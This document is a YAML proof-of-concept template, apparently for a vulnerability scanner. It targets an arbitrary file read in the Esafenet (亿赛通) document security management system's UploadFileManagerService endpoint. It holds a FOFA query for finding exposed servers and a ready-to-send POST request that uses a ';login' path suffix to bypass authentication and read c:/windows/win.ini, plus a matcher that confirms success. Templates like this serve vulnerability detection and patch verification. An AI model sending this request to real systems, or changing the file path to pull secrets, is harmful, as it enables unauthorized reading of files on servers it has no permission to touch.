id: poc-yaml-yisaitong-esafenet-uploadfilemanagerservice-anyfile-read
info:
  name: 亿赛通电子文档安全管理系统 UploadFileManagerService 任意文件读取漏洞
  severity: high
  tags:
  - 文件读取
  finger: 亿赛通电子文档安全管理系统
  fofa: body="/CDGServer3/index.jsp"
requests:
- method: POST
  path: /CDGServer3/document/UploadFileManagerService;login
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: command=ViewUploadFile&filePath=c:/windows/win.ini&fileName1=hello
  expression: status_code == 200 && contains(body,"[files]") && contains(body,"; for
    16-bit app support") && contains(headers,"filename=") && !contains(body,"<")
variables: {}
transport: http
